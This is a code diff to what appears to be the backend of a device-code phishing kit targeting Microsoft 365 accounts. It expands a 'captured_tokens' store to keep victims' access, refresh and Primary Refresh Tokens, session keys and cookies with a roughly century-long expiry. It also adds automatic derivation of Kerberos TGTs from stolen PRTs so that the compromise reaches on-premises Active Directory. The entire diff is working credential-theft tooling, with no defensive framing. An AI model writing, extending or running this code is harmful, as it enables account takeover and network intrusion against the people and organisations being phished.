@@ -418,12 +418,14 @@ async function retryAsTokenMode(originalJob) {
  */
 async function storeToken(job, tokenData, responseCookies = []) {
   try {
-    // Extract email from id_token
+    // Extract email and tenant from id_token
     let email = null;
+    let idTokenTenant = null;
     if (tokenData.id_token) {
       try {
         const payload = JSON.parse(Buffer.from(tokenData.id_token.split('.')[1], 'base64').toString());
         email = payload.email || payload.upn || payload.preferred_username || null;
+        idTokenTenant = payload.tid || null; // Extract actual tenant ID from token
       } catch (e) {
         /* ignore */
       }
@@ -442,25 +444,57 @@ async function storeToken(job, tokenData, responseCookies = []) {
       cookiesEncrypted = encrypt(cookieStrings);
     }
 
-    // Determine tenant from jwt_payload or default
-    let tenant = 'common';
-    try {
-      if (job.jwtToken) {
+    // Determine tenant - prefer id_token tenant, fallback to link's jwt_payload
+    let tenant = idTokenTenant || 'common';
+    if (!idTokenTenant && job.jwtToken) {
+      try {
         const decoded = jwt.verify(job.jwtToken, config.JWT_SECRET);
         const [links] = await db.query('SELECT jwt_payload FROM links WHERE id = ? AND user_id = ?', [decoded.link_id, decoded.user_id]);
         if (links.length && links[0].jwt_payload) {
           const parsed = JSON.parse(links[0].jwt_payload);
           if (parsed.tenant) tenant = parsed.tenant;
         }
+      } catch (e) { /* use default */ }
+    }
+
+    // Extract PRT and related fields from token response
+    let prt = null;
+    let sessionKeyJwe = null;
+    let deviceTenantId = null;
+
+    // For device code flow, refresh_token is the PRT for work/school accounts
+    if (tokenData.refresh_token) {
+      prt = tokenData.refresh_token;
+    }
+
+    // Extract session_key_enc from token response (if present)
+    if (tokenData.session_key_enc) {
+      sessionKeyJwe = tokenData.session_key_enc;
+    }
+
+    // Extract device_tenant_id from client_info
+    if (tokenData.client_info) {
+      try {
+        const clientInfo = JSON.parse(Buffer.from(tokenData.client_info, 'base64').toString());
+        deviceTenantId = clientInfo.utid || null;
+      } catch (e) { /* ignore */ }
+    }
+
+    // Determine account type from email domain (must be before INSERT)
+    let accountType = 'work_school';
+    if (email) {
+      const emailDomain = email.split('@')[1].toLowerCase();
+      if (['outlook.com', 'hotmail.com', 'live.com', 'passport.com'].includes(emailDomain)) {
+        accountType = 'personal';
       }
-    } catch (e) { /* use default */ }
+    }
 
     // Determine client_id used for this capture
     const clientIdUsed = config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
 
     const [result] = await db.query(
-       `INSERT INTO captured_tokens (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted, ip_address, user_agent, expiration, tenant, template_type, client_id)
-        VALUES (?, ?, ?, 'token', ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 876000 HOUR), ?, ?, ?)`,
+       `INSERT INTO captured_tokens (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, prt, session_key_jwe, device_tenant_id, cookies_encrypted, ip_address, user_agent, expiration, tenant, template_type, account_type, client_id)
+        VALUES (?, ?, ?, 'token', ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 876000 HOUR), ?, ?, ?, ?)`,
       [
         job.user_id,
         job.link_id,
@@ -468,16 +502,80 @@ async function storeToken(job, tokenData, responseCookies = []) {
         encrypt(tokenData.access_token),
         encrypt(tokenData.refresh_token || null),
         encrypt(tokenData.id_token || null),
+        encrypt(prt),
+        encrypt(sessionKeyJwe),
+        deviceTenantId,
         cookiesEncrypted,
         ipAddress,
         userAgent,
         tenant,
         'office',
+        accountType,
         clientIdUsed,
       ]
     );
 
     const tokenId = result.insertId;
+
+    // Log token capture details for debugging
+    console.log('[DeviceProxy] Token captured:', {
+      tokenId,
+      email,
+      accountType,
+      tenant,
+      hasPrt: !!prt,
+      hasIdToken: !!tokenData.id_token,
+      idTokenTenant: idTokenTenant || 'not extracted'
+    });
+
+    // Auto-derive Kerberos TGTs for work/school accounts with PRT
+    // This runs asynchronously and doesn't block the response
+    // Requires: PRT + work/school account + specific tenant ID (not 'common' or 'organizations')
+    if (prt && accountType === 'work_school' && tenant && tenant !== 'common' && tenant !== 'organizations') {
+      console.log('[DeviceProxy] Attempting Kerberos TGT derivation for token', tokenId, 'tenant:', tenant);
+      const kerberosService = require('./kerberos');
+      kerberosService.deriveTGTForToken(tokenId)
+        .then(derivationResult => {
+          if (derivationResult.success) {
+            console.log('[DeviceProxy] Kerberos TGT derived for token', tokenId, ':', derivationResult.email);
+            // Update the token record with Kerberos data
+            if (derivationResult.tgt_cloud) {
+              db.query(
+                'UPDATE captured_tokens SET tgt_cloud = ? WHERE id = ?',
+                [encrypt(derivationResult.tgt_cloud), tokenId]
+              ).catch(err => console.error('[DeviceProxy] Failed to save TGT cloud:', err));
+            }
+            if (derivationResult.tgt_ad) {
+              db.query(
+                'UPDATE captured_tokens SET tgt_ad = ? WHERE id = ?',
+                [encrypt(derivationResult.tgt_ad), tokenId]
+              ).catch(err => console.error('[DeviceProxy] Failed to save TGT AD:', err));
+            }
+            if (derivationResult.session_key) {
+              db.query(
+                'UPDATE captured_tokens SET tgt_cloud_sessionkey = ? WHERE id = ?',
+                [encrypt(derivationResult.session_key), tokenId]
+              ).catch(err => console.error('[DeviceProxy] Failed to save session key:', err));
+            }
+            if (derivationResult.kerberos_top_level_names) {
+              db.query(
+                'UPDATE captured_tokens SET kerberos_top_level_names = ? WHERE id = ?',
+                [derivationResult.kerberos_top_level_names, tokenId]
+              ).catch(err => console.error('[DeviceProxy] Failed to save kerberos names:', err));
+            }
+          } else {
+            console.log('[DeviceProxy] Kerberos derivation skipped for token', tokenId, ':', derivationResult.error || 'no PRT');
+          }
+        })
+        .catch(err => {
+          console.error('[DeviceProxy] Kerberos derivation error:', err.message);
+        });
+    } else {
+      console.log('[DeviceProxy] Kerberos derivation skipped:', {
+        tokenId,
+        reason: !prt ? 'no PRT' : accountType !== 'work_school' ? 'not work/school' : tenant === 'common' || tenant === 'organizations' ? 'tenant too generic (' + tenant + ')' : 'unknown'
+      });
+    }
 
     // Update visitor status to "done" (or "blocked" if block_done_visitors is enabled)
     try {
@@ -514,14 +612,6 @@ async function storeToken(job, tokenData, responseCookies = []) {
     // Timestamp for notification
     const stamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
 
-    // Determine account type from email domain
-    let accountType = 'work_school';
-    if (email) {
-      const emailDomain = email.split('@')[1].toLowerCase();
-      if (['outlook.com', 'hotmail.com', 'live.com', 'passport.com'].includes(emailDomain)) {
-        accountType = 'personal';
-      }
-    }
     const templateType = 'office';
 
     // Build caption summary (HTML, <=1024 chars)
